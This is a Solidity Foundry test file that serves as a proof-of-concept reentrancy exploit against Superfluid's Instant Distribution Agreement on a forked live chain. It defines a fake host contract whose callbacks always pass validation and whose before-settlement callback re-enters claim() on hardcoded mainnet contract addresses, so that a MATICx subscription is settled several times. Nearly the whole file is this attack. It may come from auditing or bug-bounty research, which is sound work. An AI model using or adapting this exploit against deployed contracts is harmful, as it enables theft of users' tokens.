// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface IIDA {
    function claim(address,address,uint32,address,bytes calldata) external returns (bytes memory);
    function getSubscription(address,address,uint32,address) external view returns (bool,bool,uint128,uint256);
}
interface IMATICx {
    function balanceOf(address) external view returns (uint256);
}

contract ReentrantHost {
    address public ida;
    address public maticx;
    address public publisher;
    address public subscriber;
    uint32 public indexId;
    uint public reentryCount;
    uint public maxReentry;
    
    constructor(address _ida, address _mx) { ida = _ida; maticx = _mx; }
    
    function setTarget(address _pub, uint32 _idx, address _sub, uint _max) external {
        publisher = _pub; indexId = _idx; subscriber = _sub; maxReentry = _max;
    }
    
    // Return true for publisher → callbacks fire to publisher
    function getAppManifest(address) external pure returns (bool,bool,uint256) {
        return (true, false, 0); // isSuperApp=true, not jailed, no noop
    }
    function isApp(address) external pure returns (bool) { return true; }
    function isCtxValid(bytes calldata) external pure returns (bool) { return true; }
    function decodeCtx(bytes memory) external pure returns (uint8,uint8,uint256,address,bytes4,bytes memory,uint256,uint256,int256,address,address) {
        return (0,1,0,address(0),bytes4(0),"",0,0,0,address(0),address(0));
    }
    function appCallbackPush(bytes calldata,address,uint256,int256,address) external returns (bytes memory) {
        return abi.encode(uint256(0)); // minimal valid return
    }
    function appCallbackPop(bytes calldata,int256) external returns (bytes memory) {
        return abi.encode(uint256(0));
    }
    
    // BEFORE callback — fires before settlement!
    function callAppBeforeCallback(address, bytes calldata, bool, bytes calldata) external returns (bytes memory) {
        // RE-ENTER claim during before callback!
        if (reentryCount < maxReentry) {
            reentryCount++;
            bytes memory ctx = abi.encode(
                abi.encode(uint256(1<<32),uint256(0),address(0),bytes4(0),bytes("")),
                abi.encode(uint256(0),int256(0),address(0),address(0))
            );
            // Re-enter claim
            try IIDA(ida).claim(maticx, publisher, indexId, subscriber, ctx) {
                // If this succeeds, we've settled TWICE!
            } catch {}
        }
        return "";
    }
    
    // AFTER callback
    function callAppAfterCallback(address, bytes calldata, bool, bytes calldata ctx) external returns (bytes memory) {
        return ctx; // just pass through
    }

    function attack() external {
        reentryCount = 0;
        bytes memory ctx = abi.encode(
            abi.encode(uint256(1<<32),uint256(0),address(0),bytes4(0),bytes("")),
            abi.encode(uint256(0),int256(0),address(0),address(0))
        );
        IIDA(ida).claim(maticx, publisher, indexId, subscriber, ctx);
    }
}

contract ReentrancyTest is Test {
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant PUB = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
    address constant SUB = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_reentrancyClaim() public {
        ReentrantHost rh = new ReentrantHost(IDA, MATICx);
        rh.setTarget(PUB, 1, SUB, 3);
        
        (,, uint128 units, uint256 pending) = IIDA(IDA).getSubscription(MATICx, PUB, 1, SUB);
        console.log("Before - units:", units, "pending:", pending);
        
        uint256 subBefore = IMATICx(MATICx).balanceOf(SUB);
        
        rh.attack();
        
        uint256 subAfter = IMATICx(MATICx).balanceOf(SUB);
        console.log("SUB gained:", subAfter - subBefore);
        console.log("Reentry count:", rh.reentryCount());
        
        // Check if subscription was drained multiple times
        (,,,uint256 pendingAfter) = IIDA(IDA).getSubscription(MATICx, PUB, 1, SUB);
        console.log("After - pending:", pendingAfter);
    }
}
